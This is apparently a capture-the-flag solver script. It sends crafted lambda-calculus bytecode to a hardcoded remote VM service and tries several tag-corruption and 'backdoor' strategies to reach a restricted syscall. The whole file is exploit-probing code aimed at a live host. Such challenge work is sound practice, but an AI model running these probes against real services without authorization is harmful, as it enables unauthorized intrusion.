#!/usr/bin/env python3
"""
ORACLE INSIGHT: Echo can corrupt tags!

Var(251) + 2 = Var(253) = FD (application marker!)
Var(252) + 2 = Var(254) = FE (lambda marker!)
Var(253) + 2 = Var(255) = FF (end marker!)

The trick: we can't SERIALIZE these (quote fails), but we CAN:
1. Echo a term containing Var(251/252)
2. Extract from Left wrapper WITHOUT serializing
3. Pass directly to syscall 8 via backdoor bypass

The corrupted term exists only in the VM's memory, never serialized!
"""

import socket
import time
from dataclasses import dataclass

HOST = "82.165.133.222"
PORT = 61221

FD, FE, FF = 0xFD, 0xFE, 0xFF
QD = bytes.fromhex("0500fd000500fd03fdfefd02fdfefdfe")


@dataclass(frozen=True)
class Var:
    i: int


@dataclass(frozen=True)
class Lam:
    body: object


@dataclass(frozen=True)
class App:
    f: object
    x: object


def encode_term(term: object) -> bytes:
    if isinstance(term, Var):
        return bytes([term.i])
    if isinstance(term, Lam):
        return encode_term(term.body) + bytes([FE])
    if isinstance(term, App):
        return encode_term(term.f) + encode_term(term.x) + bytes([FD])
    raise TypeError


def query(payload: bytes, timeout_s: float = 5.0) -> bytes:
    with socket.create_connection((HOST, PORT), timeout=timeout_s) as sock:
        sock.sendall(payload)
        try:
            sock.shutdown(socket.SHUT_WR)
        except:
            pass
        sock.settimeout(timeout_s)
        out = b""
        deadline = time.time() + timeout_s
        while time.time() < deadline:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                out += chunk
                if FF in chunk:
                    break
            except socket.timeout:
                break
        return out


def test(desc: str, payload: bytes) -> None:
    try:
        resp = query(payload)
        if not resp:
            print(f"{desc}: (empty/timeout)")
        elif b"Encoding failed" in resp:
            print(f"{desc}: Encoding failed!")
        elif b"Invalid term" in resp:
            print(f"{desc}: Invalid term!")
        elif b"Term too big" in resp:
            print(f"{desc}: Term too big!")
        elif resp.hex().startswith("01"):
            print(f"{desc}: Left! len={len(resp)} hex={resp.hex()[:80]}")
        else:
            print(f"{desc}: {resp.hex()[:80]}")
    except Exception as e:
        print(f"{desc}: ERROR - {e}")
    time.sleep(0.2)


def main():
    print("=" * 70)
    print("TAG CORRUPTION VIA ECHO")
    print("=" * 70)
    
    nil = Lam(Lam(Var(0)))
    syscall8 = Var(8)
    echo = Var(0x0E)
    
    print("\n=== Strategy 1: Echo Var(251/252), extract, pass to syscall 8 ===\n")
    print("echo(Var(N)) produces Left(Var(N+2)) in VM memory")
    print("We extract and pass to syscall 8 WITHOUT serializing\n")
    
    for base_var in [251, 252, 250, 249]:
        extract_to_syscall8 = Lam(
            App(
                App(Var(0), Lam(
                    App(App(syscall8, Var(0)), nil)
                )),
                nil
            )
        )
        
        payload = (
            bytes([0x0E, base_var, FD]) +
            encode_term(extract_to_syscall8) +
            bytes([FD]) +
            QD + bytes([FD, FF])
        )
        test(f"echo(Var({base_var})) -> extract -> syscall8(Var({base_var+2}))", payload)
    
    print("\n=== Strategy 2: Echo + backdoor bypass combined ===\n")
    print("Chain: backdoor -> get pair -> use pair with echoed term\n")
    
    for base_var in [251, 252]:
        backdoor_then_echo_then_sc8 = Lam(
            App(
                App(Var(0), Lam(Lam(
                    App(
                        App(echo, Var(base_var)),
                        Lam(
                            App(
                                App(Var(0), Lam(
                                    App(App(syscall8, Var(0)), nil)
                                )),
                                nil
                            )
                        )
                    )
                ))),
                nil
            )
        )
        
        payload = (
            bytes([0xC9]) + encode_term(nil) + bytes([FD]) +
            encode_term(backdoor_then_echo_then_sc8) + bytes([FD]) +
            QD + bytes([FD, FF])
        )
        test(f"backdoor -> pair -> echo(Var({base_var})) -> extract -> syscall8", payload)
    
    print("\n=== Strategy 3: Double echo for higher corruption ===\n")
    print("echo(echo(Var(249))) = Var(249+2+2) = Var(253) = FD!\n")
    
    for base_var in [249, 250, 251]:
        double_echo_to_sc8 = Lam(
            App(
                App(Var(0), Lam(
                    App(
                        App(echo, Var(0)),
                        Lam(
                            App(
                                App(Var(0), Lam(
                                    App(App(syscall8, Var(0)), nil)
                                )),
                                nil
                            )
                        )
                    )
                )),
                nil
            )
        )
        
        payload = (
            bytes([0x0E, base_var, FD]) +
            encode_term(double_echo_to_sc8) +
            bytes([FD]) +
            QD + bytes([FD, FF])
        )
        test(f"echo(Var({base_var})) -> extract -> echo -> extract -> syscall8 (Var({base_var+4}))", payload)
    
    print("\n=== Strategy 4: Use corrupted term as CONTINUATION for syscall 8 ===\n")
    print("What if the corrupted term should be the continuation, not argument?\n")
    
    for base_var in [251, 252]:
        echo_to_cont = Lam(
            App(
                App(Var(0), Lam(
                    App(App(syscall8, nil), Var(0))
                )),
                nil
            )
        )
        
        payload = (
            bytes([0x0E, base_var, FD]) +
            encode_term(echo_to_cont) +
            bytes([FD]) +
            QD + bytes([FD, FF])
        )
        test(f"echo(Var({base_var})) -> extract -> syscall8(nil, Var({base_var+2}) as cont)", payload)
    
    print("\n=== Strategy 5: Minimal 3-leaf pattern with tag corruption ===\n")
    print("Literally: ((echo Var(251)) Var(8))\n")
    
    for base_var in [251, 252, 250]:
        term = App(App(echo, Var(base_var)), syscall8)
        payload = encode_term(term) + bytes([FF])
        test(f"((echo Var({base_var})) syscall8) - 3 leaves", payload)
    
    print("\n=== Strategy 6: Use corrupted term in backdoor pair selector ===\n")
    
    for base_var in [251, 252]:
        selector_with_corrupted = Lam(
            App(
                App(echo, Var(base_var)),
                Lam(
                    App(
                        App(Var(0), Lam(Lam(
                            App(App(syscall8, Var(0)), Var(1))
                        ))),
                        nil
                    )
                )
            )
        )
        
        payload = (
            bytes([0xC9]) + encode_term(nil) + bytes([FD]) +
            encode_term(selector_with_corrupted) + bytes([FD]) +
            QD + bytes([FD, FF])
        )
        test(f"backdoor -> echo(Var({base_var})) -> extract -> use in syscall8 selector", payload)


if __name__ == "__main__":
    main()
